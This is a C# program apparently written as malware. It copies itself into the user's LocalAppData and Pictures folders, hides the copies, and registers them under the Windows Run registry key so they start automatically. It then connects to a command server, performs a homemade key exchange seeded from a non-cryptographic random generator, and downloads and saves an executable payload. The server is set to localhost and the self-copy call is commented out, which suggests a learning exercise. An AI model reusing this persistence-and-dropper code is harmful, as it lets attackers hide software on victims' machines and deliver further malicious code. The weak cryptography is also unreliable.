using Microsoft.Win32;
using System;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using Packets;
using System.Text.Json;
using System.Numerics;

namespace Tanuki_the_first
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("tanuki!!!!!!!!");

            Persistence persistence = new Persistence();
            //persistence.SelfCopy();

            EncryptedCommunication communication = new EncryptedCommunication();
            communication.ExchangeKey();
            communication.RequestExe();

            Console.ReadLine();
        }
    }

    class Persistence
    {
        private string[] path_copies = new string[] { Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), 
                                                        Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) };

        public void WriteLog(string msg)
        {
            Console.WriteLine(msg);
        }

        public void SelfCopy()
        {
            string currentCopy = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            this.WriteLog("Current copy: " + currentCopy);
            this.WriteLog("CWD: " + Directory.GetCurrentDirectory());
            
            if (currentCopy == null) { return; }

            int i = 0;
            foreach(string path in path_copies)
            {
                string copy = Path.Combine(path, "taniki_the_first" + i.ToString() + ".exe");

                if(Directory.Exists(path))
                {
                    if(!File.Exists(copy))
                    {
                        try
                        {
                            File.Copy(currentCopy, copy, true);

                            this.WriteLog("Copied successfully from: " + currentCopy);
                            this.WriteLog("Copied successfully to: " + copy);
                            
                            try
                            {
                                File.SetAttributes(copy, File.GetAttributes(copy) | FileAttributes.Hidden);
                                Console.WriteLine("Hidden attribute set for file: " + copy);
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine("Error setting hidden attribute for file: " + ex.Message);
                            }
                        }
                        catch (Exception ex)
                        {
                            this.WriteLog("Failed to copy: " + ex.Message);
                            Console.ReadLine();
                        }
                    }
                    this.ReachPersistence(copy);
                    i++;
                }
            }
        }

        private void ReachPersistence(string filePath)
        {
            string keyName = filePath.Split('\\').Last().Split('.')[0];
            string value = filePath;

            try
            {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                registryKey.SetValue(keyName, value);

                this.WriteLog(registryKey.GetValue(keyName).ToString());
                registryKey.Close();

                this.WriteLog("Persistence reached!!!");
            }
            catch (Exception ex)
            {
                this.WriteLog("Could not add program to registry: " + ex.Message);
                Console.ReadLine();
            }
        }
    }

    class EncryptedCommunication
    {
        private TcpClient client;
        private NetworkStream stream;
        private BigInteger key;
        
        private (byte[], int) Exchange(byte[] message, bool recieve)
        {
            try
            {
                this.stream.Write(message, 0, message.Length);
                Console.WriteLine("Message sent");

                if (recieve == false) return (null, 0);

                byte[] recievedMessage = new byte[2048];
                int bytesRead = stream.Read(recievedMessage, 0, recievedMessage.Length);

                return (recievedMessage, bytesRead);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error sendig or recieving message: " + ex.Message);
                return (null, 0);
            }
        }

        public void startCommunication()
        {
            try
            {
                this.client = new TcpClient("localhost", 5000);
                this.stream = client.GetStream();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Could not open connection: " + ex.Message);
                return;
            }
        }
        public void ExchangeKey()
        {
            Random rand = new Random();
            BigInteger x;
            try
            {   
                startCommunication();

                Packets.Request.KeyExchange request = new Packets.Request.KeyExchange() { Operation = "keyExchange" };
                string request_Json = JsonSerializer.Serialize<Packets.Request.KeyExchange>(request);
                byte[] request_byte = Encoding.ASCII.GetBytes(request_Json.ToString());
                Console.WriteLine("JSON: " + request_Json);
                
                (byte[] serverHalf_byte, int bytesRead) = this.Exchange(request_byte, true);
                string serverHalf = Encoding.ASCII.GetString(serverHalf_byte, 0, bytesRead);
                serverHalf = serverHalf.Replace("'", "\"");
                Console.WriteLine("Received: " + serverHalf);

                Packets.Reply.KeyExchange response = JsonSerializer.Deserialize<Packets.Reply.KeyExchange>(serverHalf);
                do
                {
                    byte[] x_bytes = new byte[128];
                    rand.NextBytes(x_bytes);
                    x_bytes[x_bytes.Length - 1] &= (byte)0x7F; //force sign bit to positive
                    x = new BigInteger(x_bytes);
                    Console.WriteLine("x computed: " + x);
                } while (x.IsOne || x.IsZero || BigInteger.Compare(x, BigInteger.Subtract(BigInteger.Parse(response.Prime), BigInteger.One)) > 0);
                Console.WriteLine("x computed: " + x);

                BigInteger gx = BigInteger.ModPow(BigInteger.Parse(response.Generator), x, BigInteger.Parse(response.Prime));
                Packets.Request.ParametersExchange parameters = new Packets.Request.ParametersExchange() { Operation = "paramsExchange", Gx_client = gx.ToString() };
                string parameters_Json = JsonSerializer.Serialize<Packets.Request.ParametersExchange>(parameters);
                byte[] params_byte = Encoding.ASCII.GetBytes(parameters_Json.ToString());

                (_, _) = this.Exchange(params_byte, false);

                Console.WriteLine("Computation key");
                this.key = BigInteger.ModPow(BigInteger.Parse(response.Gx_server), x, BigInteger.Parse(response.Prime));
                Console.WriteLine("Key: " + this.key);
            }
            catch(Exception ex)
            {
                Console.WriteLine("Could not exchange key with server: " + ex.Message);
            }
        }
        public void RequestExe()
        {
            try
            {
                Console.WriteLine("Connected to server.");

                // Receive the binary file and write it to disk
                byte[] binary_data = new byte[1024];
                int bytesRead = stream.Read(binary_data, 0, binary_data.Length);

                using (FileStream file = new FileStream("binary_file.exe", FileMode.Create, FileAccess.Write))
                {
                    file.Write(binary_data, 0, bytesRead);
                }

                Console.WriteLine("Binary file received and saved.");

                // Clean up the connection
                stream.Close();
                client.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Could not exchange key with server: " + ex.Message);
            }
        }
    }
    
}